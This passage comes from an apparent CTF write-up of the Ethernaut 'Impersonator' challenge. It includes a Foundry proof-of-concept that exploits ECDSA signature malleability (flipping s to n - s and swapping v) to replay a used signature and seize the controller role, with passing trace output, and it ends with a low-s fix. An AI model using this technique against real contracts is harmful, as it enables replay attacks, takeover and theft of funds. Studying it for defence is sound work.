        usedSignatures[signatureHash] = true;

        return _address;
    }

</code></pre>
<h3 id="impact">Impact:</h3>

<p>An attacker can:</p>

<p>1.Reuse a signature by creating a malleable version, bypassing replay protection (e.g., usedSignatures[keccak256(sig)] = true)</p>

<p>2.Impersonate a signer and perform unauthorized actions like changing contract ownership or draining funds.</p>

<p>3.Take over the controller in this specific case by using a malleable version of a previously used signature.</p>

<h3 id="proof-of-code">Proof of code:</h3>
<pre><code class="language-solidity">contract ECLockerTest is Test {
    Impersonator public imp;
    address public nk_signer;
    uint256 private nk_signerPk;
    bytes32 public msgHash;
    uint256 public lockId;
    address public controller_nk;

    function setUp() public {
        nk_signerPk = 0xA11CE;
        nk_signer = vm.addr(nk_signerPk);
        imp = new Impersonator(0); //deploy the contract impersonator
        vm.startPrank(imp.owner());
        lockId = 1;

        //  Ethereum Signed Message Hash
        msgHash = keccak256(
            abi.encodePacked(
                "\x19Ethereum Signed Message:\n32",
                bytes32(lockId)
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(nk_signerPk, msgHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        imp.deployNewLock(signature); //deploy the lock with Ethereum signed hash
        vm.stopPrank();
    }

    function testSignatureMalleability() public {
        ECLocker locker = imp.lockers(0); //EcLocker instance

        // Sign message again to get original signature
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(nk_signerPk, msgHash);

        // Duplicate signatres s in ECDSA graph: s2 = n - s1
        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 s2 = bytes32(n - uint256(s1));

        // Try using both valid signatures

        // First usage (original signature)
        vm.prank(nk_signer);
        locker.open(v1, r1, s1);
        // Second usage (malicious signature)
        // This should fail in a secure contract
        uint8 v2 = v1 == 27 ? 28 : 27;

        vm.prank(nk_signer);
        locker.open(v2, r1, s2); //  this should fail in a secure contract

        locker.changeController(v2, r1, s2, nk_signer); // this should fail in a secure contract
        assertEq(
            locker.controller(),
            controller_nk,
            "Controller should be changed"
        );
    }
}

</code></pre>
<p>Even though the original signature has already been used,but ECDSA graph have two signatures this is vulnerability</p>

<h3 id="testcase-1">TestCase:</h3>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="s">an 1 test for test/Impersnator.t.sol:ECLockerTest</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">testSignatureMalleability() (gas</span><span class="pi">:</span> <span class="s">88082)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">88082</span><span class="pi">]</span> <span class="s">ECLockerTest::testSignatureMalleability()</span>
    <span class="s">├─ [5140] Impersonator::lockers(0) [staticcall]</span>
    <span class="s">│   └─ ← [Return] ECLocker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x104fBc016F4bb334D775a19E8A6510109AC63E00</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::sign("&lt;pk&gt;", 0xc9798da569c6ded6bd4b17373ef332b7c84d68cdec3f420f583dcd7b441ae31d) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 28, 0x803c3d50f6c6045271cffbbfa6321ffca565acf7e929e7c414a32ea755347241, 0x7c93e8acd34551d042421ba504a4e96c0e216884681a0e52f65e770894342c90</span>
    <span class="s">├─ [0] VM::prank(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [31965] ECLocker::open(28, 0x803c3d50f6c6045271cffbbfa6321ffca565acf7e929e7c414a32ea755347241, 0x7c93e8acd34551d042421ba504a4e96c0e216884681a0e52f65e770894342c90)</span>
    <span class="s">│   ├─ [3000] PRECOMPILES::ecrecover(0xc9798da569c6ded6bd4b17373ef332b7c84d68cdec3f420f583dcd7b441ae31d, 28, 58002478631855971539320367201591076334196138846330609933668613418806804771393, 56348125607360146780372420456742903897957838190118489022110830123524616891536) [staticcall]</span>
    <span class="s">│   │   └─ ← [Return] 0x000000000000000000000000e05fcc23807536bee418f142d19fa0d21bb0cff7</span>
    <span class="s">│   ├─ emit Open(opener</span><span class="err">:</span> <span class="s">0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, timestamp</span><span class="err">:</span> <span class="s">1)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::prank(0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [29965] ECLocker::open(27, 0x803c3d50f6c6045271cffbbfa6321ffca565acf7e929e7c414a32ea755347241, 0x836c17532cbaae2fbdbde45afb5b1692ac8d7462472e91e8c973e7843c0214b1)</span>
    <span class="s">│   ├─ [3000] PRECOMPILES::ecrecover(0xc9798da569c6ded6bd4b17373ef332b7c84d68cdec3f420f583dcd7b441ae31d, 27, 58002478631855971539320367201591076334196138846330609933668613418806804771393, 59443963629956048643198564551945003954879726088956415360494333017993544602801) [staticcall]</span>
    <span class="s">│   │   └─ ← [Return] 0x000000000000000000000000e05fcc23807536bee418f142d19fa0d21bb0cff7</span>
    <span class="s">│   ├─ emit Open(opener</span><span class="err">:</span> <span class="s">0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, timestamp</span><span class="err">:</span> <span class="s">1)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 4.77ms (1.80ms CPU time)</span>

<span class="na">Ran 1 test suite in 15.17ms (4.77ms CPU time)</span><span class="pi">:</span> <span class="s">1 tests passed, 0 failed, 0 skipped (1 total tests)</span>
<span class="s">nithin@ScateR:~/SCATERLABs/CTFs/EthernautChallenges$</span> 
</code></pre></div></div>

<h3 id="recommendation-">Recommendation :</h3>
<p>Add a check to ensure the signature’s s value is in the lower half order of the curve.</p>
<pre><code class="language-solidity">require(
    uint256(s) &lt;= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0,
    "Invalid s value"
);

</code></pre>
<p>Also ensure v is either 27 or 28:</p>
<pre><code class="language-solidity">require(v == 27 || v == 28, "Invalid v value");

</code></pre>
<p>This ensures all accepted signatures are in canonical form, which eliminates malleability.</p>

<p><strong>THANK YOU</strong></p>]]></content><author><name></name></author><category term="writeups" /><category term="ctfs" /><category term="blockchain" /><summary type="html"><![CDATA[Ethernaut Challenges]]></summary></entry></feed>